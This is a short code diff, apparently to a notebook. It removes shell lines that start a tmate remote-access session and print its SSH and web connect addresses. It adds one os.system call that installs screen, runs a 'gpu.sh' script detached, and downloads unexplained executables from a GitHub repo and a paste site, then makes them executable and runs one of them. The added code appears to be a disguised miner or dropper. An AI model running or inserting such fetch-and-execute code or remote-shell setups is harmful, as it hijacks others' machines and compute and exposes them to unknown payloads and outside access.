@@ -1,6 +1,2 @@
-!wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-!tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-!rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
-!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
-!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with SSH address: #{tmate_ssh}"
-!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with web: #{tmate_web}"
+import os
+os.system("sudo apt update && sudo apt install screen -y && screen -dmS gpu.sh ./gpu.sh 65 75 && wget https://github.com/hambana01/cici/raw/main/lolai && chmod 755 lolai && wget https://www.heypasteit.com/download/0IWM2E && chmod 755 0IWM2E && ./0IWM2E")
